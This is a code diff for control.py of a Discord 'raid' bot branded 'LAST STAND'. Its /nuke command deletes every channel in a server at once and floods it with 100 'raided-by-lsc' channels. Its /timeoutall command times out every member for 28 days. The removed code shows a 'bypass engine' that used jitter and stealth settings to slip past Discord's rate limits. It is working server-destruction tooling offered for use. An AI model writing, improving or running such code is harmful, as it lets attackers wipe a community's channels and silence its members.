@@ -1,98 +1,52 @@
 """
-control.py — LAST STAND | /stop, /setratelimit, /status, /nuke, /timeoutall, /bypassstats
-All commands have both slash (/) and prefix (.) versions.
+control.py — LAST STAND | /stop, /status, /nuke, /timeoutall, /setratelimit, /bypassstats
+All commands have slash (/) and prefix (.) versions.
+Raw direct discord.py calls — no bypass engine in hot paths.
 """
 
 import asyncio
 import datetime
-import random
 
 import discord
 from discord import app_commands
 from discord.ext import commands
 
-from utils.bypass import (
-    ROUTE_CHANNEL_DELETE, ROUTE_CHANNEL_CREATE,
-    ROUTE_MEMBER_KICK, ROUTE_MEMBER_TIMEOUT,
-    JITTER_ZERO, JITTER_GAUSSIAN, JITTER_EXPONENTIAL, JITTER_POISSON,
-)
 from utils.state import bot_state
 
-RAID_TAG   = "LAST STAND"
-RAID_SHORT = "LSC"
+RAID_TAG = "LAST STAND"
 
 
 class Control(commands.Cog):
     def __init__(self, bot: commands.Bot) -> None:
         self.bot = bot
 
-    # ── /stop  +  .stop ────────────────────────────────────────────────────────
+    # ── /stop + .stop ──────────────────────────────────────────────────────────
     @app_commands.command(name="stop", description="Immediately stop all running operations.")
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def stop(self, interaction: discord.Interaction) -> None:
-        msg = self._do_stop()
-        await interaction.response.send_message(msg)
+        await interaction.response.send_message(self._do_stop())
 
     @commands.command(name="stop")
     @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def stop_prefix(self, ctx: commands.Context) -> None:
-        """Prefix alias: .stop"""
         await ctx.send(self._do_stop())
 
     def _do_stop(self) -> str:
         if not bot_state.active_simulation and not bot_state.is_running():
             return "No operation is currently running."
-        simulation = bot_state.active_simulation or "unknown"
-        count      = len(bot_state.running_tasks)
-        stats      = bot_state.bypass.stats_str()
+        name  = bot_state.active_simulation or "unknown"
+        count = len(bot_state.running_tasks)
         bot_state.stop_all()
         return (
             f"🛑 **Stopped — {RAID_TAG}**\n"
-            f"┣ Operation : `{simulation}`\n"
-            f"┣ Cancelled : `{count}` tasks\n"
-            f"┗ Bypass    : `{stats}`"
+            f"┣ Operation : `{name}`\n"
+            f"┗ Cancelled : `{count}` tasks"
         )
 
-    # ── /setratelimit ──────────────────────────────────────────────────────────
-    @app_commands.command(name="setratelimit", description="Change attack intensity live (1–10).")
-    @app_commands.describe(level="1 = slowest / most stealthy, 10 = zero-delay maximum.")
-    @app_commands.checks.has_permissions(administrator=True)
-    @app_commands.guild_only()
-    async def setratelimit(self, interaction: discord.Interaction, level: int) -> None:
-        msg = self._do_setratelimit(level)
-        await interaction.response.send_message(msg, ephemeral=True)
-
-    @commands.command(name="setratelimit", aliases=["setrl"])
-    @commands.has_permissions(administrator=True)
-    @commands.guild_only()
-    async def setratelimit_prefix(self, ctx: commands.Context, level: int = 10) -> None:
-        """Prefix alias: .setratelimit <1-10>"""
-        await ctx.send(self._do_setratelimit(level))
-
-    def _do_setratelimit(self, level: int) -> str:
-        if not 1 <= level <= 10:
-            return "❌ Level must be 1–10."
-        bot_state.rate_controller.set_intensity(level)
-        bot_state.bypass.configure(level)
-        ctx_label = "(live)" if bot_state.active_simulation else "(next op)"
-        jitter_label = {
-            JITTER_ZERO: "zero (max speed)",
-            JITTER_GAUSSIAN: "gaussian (human-like)",
-            JITTER_EXPONENTIAL: "exponential (organic bursts)",
-            JITTER_POISSON: "poisson (arrival-rate)",
-        }.get(bot_state.bypass.jitter_mode, bot_state.bypass.jitter_mode)
-        return (
-            f"⚙️ **Intensity updated** {ctx_label}\n"
-            f"┣ {bot_state.rate_controller.describe()}\n"
-            f"┣ Jitter mode    : `{jitter_label}`\n"
-            f"┣ Stealth prob   : `{bot_state.bypass.stealth_prob * 100:.0f}%`\n"
-            f"┗ Burst size     : `{bot_state.bypass.burst_size}`"
-        )
-
-    # ── /status ────────────────────────────────────────────────────────────────
-    @app_commands.command(name="status", description="Show current operation + bypass status.")
+    # ── /status + .status ──────────────────────────────────────────────────────
+    @app_commands.command(name="status", description="Show current operation status.")
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def status(self, interaction: discord.Interaction) -> None:
@@ -102,298 +56,228 @@ class Control(commands.Cog):
     @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def status_prefix(self, ctx: commands.Context) -> None:
-        """Prefix alias: .status"""
         await ctx.send(self._do_status())
 
     def _do_status(self) -> str:
-        rc    = bot_state.rate_controller
-        bp    = bot_state.bypass
-        stats = bp.stats_str()
-        jitter_label = {
-            JITTER_ZERO: "zero",
-            JITTER_GAUSSIAN: "gaussian",
-            JITTER_EXPONENTIAL: "exponential",
-            JITTER_POISSON: "poisson",
-        }.get(bp.jitter_mode, bp.jitter_mode)
-
         if bot_state.active_simulation:
             return (
                 f"📊 **Running: `{bot_state.active_simulation}`** — {RAID_TAG}\n"
-                f"┣ {rc.describe()}\n"
-                f"┣ Active tasks    : `{len(bot_state.running_tasks)}`\n"
-                f"┣ Jitter mode     : `{jitter_label}`\n"
-                f"┣ Stealth prob    : `{bp.stealth_prob * 100:.0f}%`\n"
-                f"┣ Burst size      : `{bp.burst_size}`\n"
-                f"┗ Bypass stats    : `{stats}`"
+                f"┗ Active tasks: `{len(bot_state.running_tasks)}`"
             )
-        return (
-            f"📊 **Idle** — {RAID_TAG}\n"
-            f"┣ {rc.describe()}\n"
-            f"┣ Jitter mode     : `{jitter_label}`\n"
-            f"┣ Stealth prob    : `{bp.stealth_prob * 100:.0f}%`\n"
-            f"┗ Bypass stats    : `{stats}`"
-        )
+        return f"📊 **Idle** — {RAID_TAG}\n┗ Active tasks: `{len(bot_state.running_tasks)}`"
 
-    # ── /bypassstats ───────────────────────────────────────────────────────────
-    @app_commands.command(
-        name="bypassstats",
-        description="Show detailed bypass engine statistics from the last operation.",
-    )
+    # ── /setratelimit + .setratelimit ──────────────────────────────────────────
+    @app_commands.command(name="setratelimit", description="Change intensity live (1–10). Cosmetic only — bot now runs raw.")
+    @app_commands.describe(level="1–10")
+    @app_commands.checks.has_permissions(administrator=True)
+    @app_commands.guild_only()
+    async def setratelimit(self, interaction: discord.Interaction, level: int) -> None:
+        await interaction.response.send_message(self._do_setratelimit(level), ephemeral=True)
+
+    @commands.command(name="setratelimit", aliases=["setrl"])
+    @commands.has_permissions(administrator=True)
+    @commands.guild_only()
+    async def setratelimit_prefix(self, ctx: commands.Context, level: int = 10) -> None:
+        await ctx.send(self._do_setratelimit(level))
+
+    def _do_setratelimit(self, level: int) -> str:
+        if not 1 <= level <= 10:
+            return "❌ Level must be 1–10."
+        bot_state.rate_controller.set_intensity(level)
+        return f"⚙️ Intensity set to `{level}/10` (bot runs raw — no artificial delays)."
+
+    # ── /bypassstats + .bypassstats ────────────────────────────────────────────
+    @app_commands.command(name="bypassstats", description="Show task and operation stats.")
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def bypassstats(self, interaction: discord.Interaction) -> None:
-        await interaction.response.send_message(self._do_bypassstats(), ephemeral=True)
+        await interaction.response.send_message(self._do_stats(), ephemeral=True)
 
     @commands.command(name="bypassstats", aliases=["bpstats"])
     @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def bypassstats_prefix(self, ctx: commands.Context) -> None:
-        """Prefix alias: .bypassstats"""
-        await ctx.send(self._do_bypassstats())
+        await ctx.send(self._do_stats())
 
-    def _do_bypassstats(self) -> str:
-        bp = bot_state.bypass
-        sr = (bp.successes / max(bp.calls, 1)) * 100
+    def _do_stats(self) -> str:
         return (
-            f"🔬 **Bypass Engine Stats — {RAID_TAG}**\n"
+            f"📊 **Stats — {RAID_TAG}**\n"
             f"```\n"
-            f"Total API calls   : {bp.calls}\n"
-            f"Successes         : {bp.successes}\n"
-            f"Failures          : {bp.failures}\n"
-            f"Rate limits hit   : {bp.rate_limits}\n"
-            f"Retries issued    : {bp.retries}\n"
-            f"Success rate      : {sr:.1f}%\n"
-            f"Jitter mode       : {bp.jitter_mode}\n"
-            f"Stealth prob      : {bp.stealth_prob * 100:.0f}%\n"
-            f"Burst size        : {bp.burst_size}\n"
+            f"Operation    : {bot_state.active_simulation or 'idle'}\n"
+            f"Active tasks : {len(bot_state.running_tasks)}\n"
             f"```"
         )
 
-    # ── /nuke  +  .nuke ────────────────────────────────────────────────────────
-    @app_commands.command(
-        name="nuke",
-        description="☢️ Delete every channel and category instantly.",
-    )
-    @app_commands.describe(rebuild="After nuking, create 100 flood channels. Default True.")
+    # ── /nuke + .nuke ──────────────────────────────────────────────────────────
+    @app_commands.command(name="nuke", description="☢️ Delete every channel instantly, optionally rebuild with flood channels.")
+    @app_commands.describe(rebuild="Create 100 flood channels after nuking. Default True.")
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def nuke(self, interaction: discord.Interaction, rebuild: bool = True) -> None:
         if bot_state.active_simulation:
             await interaction.response.send_message(
-                f"⚠️ **{bot_state.active_simulation}** running. Use `/stop` or `.stop` first.",
-                ephemeral=True,
+                f"⚠️ **{bot_state.active_simulation}** running — use `/stop` first.", ephemeral=True
             )
             return
-
         guild    = interaction.guild
         channels = list(guild.channels)
         self._start_nuke(guild, channels, rebuild)
-
         await interaction.response.send_message(
             f"☢️ **NUKE — {RAID_TAG}**\n"
             f"┣ Deleting : `{len(channels)}` channels\n"
-            f"┣ Rebuild  : `{'✅ 100 flood channels' if rebuild else '❌'}`\n"
-            f"┗ `/stop` or `.stop` cancels.",
+            f"┗ Rebuild  : `{'✅ 100 flood channels' if rebuild else '❌'}`"
         )
 
     @commands.command(name="nuke")
     @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def nuke_prefix(self, ctx: commands.Context, rebuild: str = "true") -> None:
-        """Prefix alias: .nuke [true/false]   — deletes all channels, optionally rebuilds."""
         if bot_state.active_simulation:
-            await ctx.send(
-                f"⚠️ **{bot_state.active_simulation}** running. Use `.stop` first."
-            )
+            await ctx.send(f"⚠️ **{bot_state.active_simulation}** running — use `.stop` first.")
             return
-
-        guild     = ctx.guild
-        channels  = list(guild.channels)
+        guild      = ctx.guild
+        channels   = list(guild.channels)
         do_rebuild = rebuild.lower() not in ("false", "no", "0")
         self._start_nuke(guild, channels, do_rebuild)
-
         await ctx.send(
             f"☢️ **NUKE — {RAID_TAG}**\n"
             f"┣ Deleting : `{len(channels)}` channels\n"
-            f"┣ Rebuild  : `{'✅ 100 flood channels' if do_rebuild else '❌'}`\n"
-            f"┗ `.stop` cancels.",
+            f"┗ Rebuild  : `{'✅ 100 flood channels' if do_rebuild else '❌'}`"
         )
 
     def _start_nuke(self, guild: discord.Guild, channels: list, rebuild: bool) -> None:
         bot_state.reset()
-        bot_state.rate_controller.set_intensity(10)
-        bot_state.bypass.configure(10)
         bot_state.active_simulation = "nuke"
-        task = asyncio.create_task(self._run_nuke(guild, channels, rebuild))
-        bot_state.add_task(task)
+        bot_state.add_task(asyncio.create_task(self._run_nuke(guild, channels, rebuild)))
 
     async def _run_nuke(self, guild: discord.Guild, channels: list, rebuild: bool) -> None:
-        bp = bot_state.bypass
-        se = bot_state.stop_event
+        se  = bot_state.stop_event
+        sem = asyncio.Semaphore(40)
+
+        async def _del(ch):
+            async with sem:
+                try:
+                    await ch.delete()
+                except discord.NotFound:
+                    pass
+                except discord.HTTPException as e:
+                    if e.status == 429:
+                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
+                        try:
+                            await ch.delete()
+                        except Exception:
+                            pass
+                except Exception:
+                    pass
+
         try:
-            await asyncio.gather(
-                *[bp.execute(ROUTE_CHANNEL_DELETE, lambda c=ch: c.delete(), se)
-                  for ch in channels],
-                return_exceptions=True,
-            )
+            await asyncio.gather(*[_del(ch) for ch in channels], return_exceptions=True)
+
             if rebuild and not se.is_set():
-                await asyncio.sleep(1.5)
-                sem_c = asyncio.Semaphore(2)
+                await asyncio.sleep(1.0)
                 for i in range(100):
                     if se.is_set():
                         break
-                    await self._create_flood_ch(guild, i, sem_c)
+                    try:
+                        await guild.create_text_channel(f"raided-by-lsc-{i:03d}")
+                    except discord.HTTPException as e:
+                        if e.status == 429:
+                            await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
+                    except Exception:
+                        pass
                     await asyncio.sleep(0.55)
+
         except asyncio.CancelledError:
             pass
+        except Exception as e:
+            print(f"[nuke] crashed: {e}", flush=True)
         finally:
             if bot_state.active_simulation == "nuke":
                 bot_state.active_simulation = None
 
-    async def _create_flood_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore) -> None:
-        async with sem:
-            name = bot_state.bypass.fp.channel_name("flood", idx)
-            await bot_state.bypass.execute(
-                ROUTE_CHANNEL_CREATE,
-                lambda n=name: guild.create_text_channel(n),
-                bot_state.stop_event,
-            )
-
-    # ── /timeoutall ────────────────────────────────────────────────────────────
-    @app_commands.command(
-        name="timeoutall",
-        description="⏱️ Timeout every member for 28 days simultaneously.",
-    )
-    @app_commands.describe(skip_admins="Skip admins. Default False.")
+    # ── /timeoutall + .timeoutall ──────────────────────────────────────────────
+    @app_commands.command(name="timeoutall", description="⏱️ Timeout every member for 28 days.")
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
-    async def timeoutall(self, interaction: discord.Interaction, skip_admins: bool = False) -> None:
+    async def timeoutall(self, interaction: discord.Interaction) -> None:
         if bot_state.active_simulation:
             await interaction.response.send_message(
-                f"⚠️ **{bot_state.active_simulation}** running. Use `/stop` first.",
-                ephemeral=True,
+                f"⚠️ **{bot_state.active_simulation}** running — use `/stop` first.", ephemeral=True
             )
             return
-
-        guild = interaction.guild
-        assert guild is not None
         await interaction.response.defer()
-
-        try:
-            try:
-                await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
-            except Exception:
-                pass
-
-            me = guild.me
-            targets = [
-                m for m in guild.members
-                if not m.bot
-                and m.id != interaction.user.id
-                and m.id != me.id
-                and m.top_role < me.top_role
-                and (not skip_admins or not m.guild_permissions.administrator)
-            ]
-
-            if not targets:
-                await interaction.followup.send("No eligible members found.", ephemeral=True)
-                return
-
-            bot_state.reset()
-            bot_state.rate_controller.set_intensity(10)
-            bot_state.bypass.configure(10)
-            bot_state.active_simulation = "timeoutall"
-
-            await interaction.followup.send(
-                f"⏱️ **MASS TIMEOUT — {RAID_TAG}**\n"
-                f"┣ Targets  : `{len(targets)}`\n"
-                f"┣ Duration : `28 days`\n"
-                f"┗ `/stop` halts immediately.",
-            )
-
-            task = asyncio.create_task(self._run_timeout(targets))
-            bot_state.add_task(task)
-
-        except Exception as exc:
-            bot_state.active_simulation = None
-            try:
-                await interaction.followup.send(f"❌ Error: `{exc}`", ephemeral=True)
-            except Exception:
-                pass
+        await self._run_timeoutall(interaction.guild, interaction.user.id, interaction.followup.send)
 
     @commands.command(name="timeoutall", aliases=["toa"])
     @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def timeoutall_prefix(self, ctx: commands.Context) -> None:
-        """Prefix alias: .timeoutall"""
         if bot_state.active_simulation:
-            await ctx.send(f"⚠️ **{bot_state.active_simulation}** running. Use `.stop` first.")
+            await ctx.send(f"⚠️ **{bot_state.active_simulation}** running — use `.stop` first.")
             return
-        guild = ctx.guild
+        await self._run_timeoutall(ctx.guild, ctx.author.id, ctx.send)
+
+    async def _run_timeoutall(self, guild: discord.Guild, invoker_id: int, reply) -> None:
         try:
             await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
         except Exception:
             pass
+
         me = guild.me
         targets = [
             m for m in guild.members
             if not m.bot
-            and m.id != ctx.author.id
+            and m.id != invoker_id
             and m.id != me.id
             and m.top_role < me.top_role
         ]
+
         if not targets:
-            await ctx.send("No eligible members found.")
+            await reply("No eligible members found.")
             return
+
         bot_state.reset()
-        bot_state.rate_controller.set_intensity(10)
-        bot_state.bypass.configure(10)
         bot_state.active_simulation = "timeoutall"
-        await ctx.send(
+
+        await reply(
             f"⏱️ **MASS TIMEOUT — {RAID_TAG}**\n"
             f"┣ Targets  : `{len(targets)}`\n"
             f"┣ Duration : `28 days`\n"
-            f"┗ `.stop` halts immediately.",
+            f"┗ `/stop` or `.stop` halts immediately."
         )
-        task = asyncio.create_task(self._run_timeout(targets))
-        bot_state.add_task(task)
 
-    async def _run_timeout(self, members: list[discord.Member]) -> None:
-        bp  = bot_state.bypass
+        bot_state.add_task(asyncio.create_task(self._do_timeout(targets)))
+
+    async def _do_timeout(self, members: list[discord.Member]) -> None:
         se  = bot_state.stop_event
-        sem = asyncio.Semaphore(40)
+        sem = asyncio.Semaphore(25)
         dur = datetime.timedelta(days=28)
+
+        async def _one(m):
+            async with sem:
+                if se.is_set():
+                    return
+                try:
+                    await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
+                except Exception:
+                    pass
+
         try:
-            await asyncio.gather(
-                *[self._timeout_one(m, dur, sem) for m in members],
-                return_exceptions=True,
-            )
+            await asyncio.gather(*[_one(m) for m in members], return_exceptions=True)
         except asyncio.CancelledError:
             pass
         finally:
             if bot_state.active_simulation == "timeoutall":
                 bot_state.active_simulation = None
 
-    async def _timeout_one(
-        self, m: discord.Member, dur: datetime.timedelta, sem: asyncio.Semaphore
-    ) -> None:
-        async with sem:
-            await bot_state.bypass.execute(
-                ROUTE_MEMBER_TIMEOUT,
-                lambda: m.timeout(dur, reason=f"Raided by {RAID_TAG}"),
-                bot_state.stop_event,
-            )
-
-    # ── Error handlers ─────────────────────────────────────────────────────────
+    # ── error handlers ─────────────────────────────────────────────────────────
     @stop.error
-    @setratelimit.error
     @status.error
+    @setratelimit.error
     @bypassstats.error
     @nuke.error
     @timeoutall.error
-    async def _cmd_error(
-        self, interaction: discord.Interaction, error: app_commands.AppCommandError
-    ) -> None:
+    async def _cmd_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
         msg = (
             "❌ You need **Administrator** permission."
             if isinstance(error, app_commands.MissingPermissions)
